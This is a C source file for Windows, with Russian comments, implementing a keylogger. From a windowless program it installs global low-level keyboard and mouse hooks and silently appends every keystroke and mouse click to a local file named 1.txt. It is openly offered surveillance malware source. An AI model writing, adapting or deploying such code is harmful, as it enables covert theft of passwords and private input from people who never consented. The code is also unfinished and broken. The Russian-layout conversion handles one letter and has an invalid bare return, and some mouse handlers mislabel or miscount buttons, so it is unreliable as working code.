#include <Windows.h>
#include <stdio.h>

#define PATH L"1.txt"
#define RUS 1049
#define ENG 1033
#define SIZE_STR 20

LRESULT CALLBACK LogMouse(int iCode, WPARAM wParam, LPARAM lParam);
DWORD LKey = 0, RKey = 0;

BOOL IsCaps(void);
LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam);
VOID WriteToFile(LPWSTR wstr);
WCHAR EnToRus(WCHAR c);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, int nCmdShow)
{
	HHOOK hHook = SetWindowsHookExW(WH_KEYBOARD_LL, LogKey, NULL, NULL);
	HHOOK hHOOK = SetWindowsHookExW(WH_MOUSE_LL, LogMouse, NULL, NULL);
	MSG msg = { 0 };
	while (GetMessageW(&msg, NULL, 0, 0))	//функция ожидает системного сообщения
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(hHook);
	UnhookWindowsHookEx(hHOOK);
	return 0;
}

BOOL IsCaps(void)
{
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ^
		(GetKeyState(VK_SHIFT) & 0x8000) != 0)
		return TRUE;
	return FALSE;
}

LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam)	//клава
{
	if (wParam == WM_KEYDOWN)
	{
		PKBDLLHOOKSTRUCT pHook = (PKBDLLHOOKSTRUCT)lParam;
		WORD KeyLayout = LOWORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0)));
		DWORD iKey = MapVirtualKey(pHook->vkCode, NULL) << 16;
		if (!(pHook->vkCode <= 1 << 5))
			iKey |= 0x1 << 24;
		LPWSTR KeyString = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR));
		GetKeyNameTextW(iKey, KeyString, SIZE_STR);
		if (wcslen(KeyString) > 1)
		{
			WriteToFile(L"[");
			WriteToFile(KeyString);
			WriteToFile(L"] ");
		}
		else
		{
			if (!IsCaps()) KeyString[0] = tolower(KeyString[0]);
			if (KeyLayout == ENG)
			{

			}
			if (KeyLayout == RUS)
			{
				KeyString[0] = EnToRus(KeyString[0]);
			}
			WriteToFile(KeyString);
		}
		free(KeyString);
	}
	return CallNextHookEx(NULL, iCode, wParam, lParam);
}

LRESULT CALLBACK LogMouse(int iCode, WPARAM wParam, LPARAM lParam)	//мышка
{
	if (wParam == 513)
	{
		LKey++;
		LPWSTR String = (LPWSTR)calloc(150, sizeof(WCHAR));
		swprintf(String, 150, L"Левая кнопка");
		WriteToFile(L"[");
		WriteToFile(String);
		WriteToFile(L"] ");
		free(String);
	}
	if (wParam == 516)
	{
		RKey++;
		LPWSTR String = (LPWSTR)calloc(150, sizeof(WCHAR));
		swprintf(String, 150, L"Правая кнопка");
		WriteToFile(L"[");
		WriteToFile(String);
		WriteToFile(L"] ");
		free(String);
	}
	if (wParam == 519)
	{
		RKey++;
		LPWSTR String = (LPWSTR)calloc(150, sizeof(WCHAR));
		swprintf(String, 150, L"Средняя кнопка мыши");
		WriteToFile(L"[");
		WriteToFile(String);
		WriteToFile(L"] ");
		free(String);
	}
	if (wParam == 522)
	{
		RKey++;
		LPWSTR String = (LPWSTR)calloc(150, sizeof(WCHAR));
		swprintf(String, 150, L"мыши");
		WriteToFile(L"[");
		WriteToFile(String);
		WriteToFile(L"] ");
		free(String);
	}
	return CallNextHookEx(NULL, iCode, wParam, lParam);
}

VOID WriteToFile(LPWSTR wstr)
{
	FILE* f = NULL;
	if (!_wfopen_s(&f, PATH, L"ab"))
	{
		fwrite(wstr, sizeof(WCHAR), wcslen(wstr), f);
		fclose(f);
	}
}

WCHAR EnToRus(WCHAR c)
{
	switch (c)
	{
	case L'q':
		return L'й';
	default:
		return ;
	}
}